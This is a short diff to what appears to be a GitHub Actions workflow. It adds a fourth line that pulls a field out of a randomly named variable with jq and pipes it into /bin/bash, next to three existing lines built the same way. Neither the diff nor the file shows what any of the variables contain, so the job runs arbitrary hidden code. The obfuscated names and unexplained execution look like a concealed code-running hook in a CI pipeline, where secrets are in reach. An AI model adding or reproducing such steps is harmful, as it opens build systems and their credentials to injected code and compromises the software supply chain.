@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$mudkb7" | jq -r .f1670 | /bin/bash
           echo $hoti34 | jq -r .xjbl4103 | /bin/bash
           printf '%s' "$o02604" | jq -r .n55 | /bin/bash
+          echo $jjli4904 | jq -r .debp2 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
